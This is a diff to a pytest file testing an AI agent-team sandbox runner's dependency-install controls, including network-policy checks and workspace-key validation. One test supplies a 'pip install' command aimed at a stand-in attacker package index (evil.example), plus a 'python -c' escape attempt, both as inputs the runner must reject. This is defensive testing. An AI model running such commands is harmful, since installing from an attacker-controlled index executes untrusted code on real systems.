@@ -5,6 +5,7 @@ from __future__ import annotations
 import asyncio
 import os
 import subprocess
+import sys
 from pathlib import Path, PurePosixPath
 
 import pytest
@@ -54,13 +55,15 @@ def test_execution_request_rejects_agent_environment_overrides():
         )
 
 
-def test_local_runner_does_not_support_dependency_profile(tmp_path):
+def test_local_runner_advertises_dependency_profile_for_explicit_local_installs(
+    tmp_path,
+):
     service, workspace = _workspace(tmp_path)
     runner = LocalExecutionRunner(workspace, service)
 
     assert runner.supports_profile(ExecutionProfile.AGENT)
     assert not runner.supports_profile(ExecutionProfile.TRUSTED_CONTROL)
-    assert not runner.supports_profile(ExecutionProfile.DEPENDENCY)
+    assert runner.supports_profile(ExecutionProfile.DEPENDENCY)
 
 
 @pytest.mark.parametrize(
@@ -805,17 +808,194 @@ def test_trusted_git_runner_does_not_consult_ambient_git_path(tmp_path, monkeypa
 
 
 @pytest.mark.asyncio
-async def test_local_runner_rejects_dependency_profile(tmp_path):
+async def test_local_runner_executes_dependency_profile_only_with_full_access(
+    tmp_path,
+    monkeypatch,
+):
     service, workspace = _workspace(tmp_path)
     runner = LocalExecutionRunner(workspace, service)
 
+    async def full_access_policy():
+        return AgentTeamNetworkPolicy.FULL_ACCESS
+
+    monkeypatch.setattr(
+        "backend.services.agent_team.execution.get_agent_team_network_policy",
+        full_access_policy,
+    )
+
+    result = await runner.execute(
+        ExecutionRequest(
+            workspace_key=runner.workspace_key,
+            argv=(str(Path(sys.executable).resolve()), "-m", "venv", ".venv"),
+            profile=ExecutionProfile.DEPENDENCY,
+        )
+    )
+
+    assert result.returncode == 0
+    assert (workspace / ".venv").is_dir()
+
+
+@pytest.mark.asyncio
+async def test_local_runner_rejects_dependency_profile_without_full_access(
+    tmp_path,
+    monkeypatch,
+):
+    service, workspace = _workspace(tmp_path)
+    runner = LocalExecutionRunner(workspace, service)
+
+    async def web_tools_policy():
+        return AgentTeamNetworkPolicy.WEB_TOOLS
+
+    monkeypatch.setattr(
+        "backend.services.agent_team.execution.get_agent_team_network_policy",
+        web_tools_policy,
+    )
+
+    request = ExecutionRequest(
+        workspace_key=execution_workspace_key(workspace, service),
+        argv=(str(Path(sys.executable).resolve()), "-m", "venv", ".venv"),
+        profile=ExecutionProfile.DEPENDENCY,
+    )
+    with pytest.raises(ExecutionError, match="full_access"):
+        await runner.execute(request)
+    assert not (workspace / ".venv").exists()
+
+
+@pytest.mark.asyncio
+async def test_local_runner_rejects_workspace_key_mismatch_before_spawn(
+    tmp_path,
+    monkeypatch,
+):
+    service, workspace = _workspace(tmp_path)
+    runner = LocalExecutionRunner(workspace, service)
+
+    async def fail_policy_read():
+        raise AssertionError("workspace mismatch must be rejected first")
+
+    monkeypatch.setattr(
+        "backend.services.agent_team.execution.get_agent_team_network_policy",
+        fail_policy_read,
+    )
     request = ExecutionRequest(
         workspace_key="task-1",
         command="echo should-not-run",
+        profile=ExecutionProfile.AGENT,
+    )
+
+    with pytest.raises(ExecutionError, match="workspace_key"):
+        await runner.execute(request)
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "request_factory",
+    [
+        lambda runner, key: ExecutionRequest(
+            workspace_key=key,
+            command="python -m venv .venv",
+            profile=ExecutionProfile.DEPENDENCY,
+        ),
+        lambda runner, key: ExecutionRequest(
+            workspace_key=key,
+            argv=(str(Path(sys.executable).resolve()), "-c", "print('escape')"),
+            profile=ExecutionProfile.DEPENDENCY,
+        ),
+        lambda runner, key: ExecutionRequest(
+            workspace_key=key,
+            argv=(
+                str(Path(sys.executable).resolve()),
+                "-m",
+                "pip",
+                "install",
+                "--index-url",
+                "https://evil.example/simple",
+                "package",
+            ),
+            profile=ExecutionProfile.DEPENDENCY,
+        ),
+    ],
+)
+async def test_local_runner_rejects_uncontrolled_dependency_requests(
+    request_factory,
+    tmp_path,
+    monkeypatch,
+):
+    service, workspace = _workspace(tmp_path)
+    runner = LocalExecutionRunner(workspace, service)
+
+    async def full_access_policy():
+        return AgentTeamNetworkPolicy.FULL_ACCESS
+
+    monkeypatch.setattr(
+        "backend.services.agent_team.execution.get_agent_team_network_policy",
+        full_access_policy,
+    )
+    request = request_factory(runner, runner.workspace_key)
+
+    with pytest.raises(UnsupportedExecutionProfile, match="受控|不受支持"):
+        await runner.execute(request)
+
+
+@pytest.mark.asyncio
+async def test_local_runner_rechecks_full_access_between_dependency_requests(
+    tmp_path,
+    monkeypatch,
+):
+    service, workspace = _workspace(tmp_path)
+    runner = LocalExecutionRunner(workspace, service)
+    policies = iter(
+        (
+            AgentTeamNetworkPolicy.FULL_ACCESS,
+            AgentTeamNetworkPolicy.WEB_TOOLS,
+        )
+    )
+
+    async def changing_policy():
+        return next(policies)
+
+    monkeypatch.setattr(
+        "backend.services.agent_team.execution.get_agent_team_network_policy",
+        changing_policy,
+    )
+    real_create_subprocess_exec = execution_module.asyncio.create_subprocess_exec
+    spawned: list[tuple[object, ...]] = []
+
+    async def observed_create(*args, **kwargs):
+        spawned.append(args)
+        return await real_create_subprocess_exec(*args, **kwargs)
+
+    monkeypatch.setattr(
+        execution_module.asyncio,
+        "create_subprocess_exec",
+        observed_create,
+    )
+    key = runner.workspace_key
+    bootstrap = ExecutionRequest(
+        workspace_key=key,
+        argv=(str(Path(sys.executable).resolve()), "-m", "venv", ".venv"),
         profile=ExecutionProfile.DEPENDENCY,
     )
-    with pytest.raises(UnsupportedExecutionProfile):
-        await runner.execute(request)
+    dependency = ExecutionRequest(
+        workspace_key=key,
+        argv=(
+            str(runner.dependency_venv_python()),
+            "-m",
+            "pip",
+            "install",
+            "-r",
+            "requirements.txt",
+            "--quiet",
+        ),
+        profile=ExecutionProfile.DEPENDENCY,
+    )
+
+    first = await runner.execute(bootstrap)
+    assert first.returncode == 0
+    assert len(spawned) == 1
+
+    with pytest.raises(ExecutionError, match="full_access"):
+        await runner.execute(dependency)
+    assert len(spawned) == 1
 
 
 @pytest.mark.asyncio
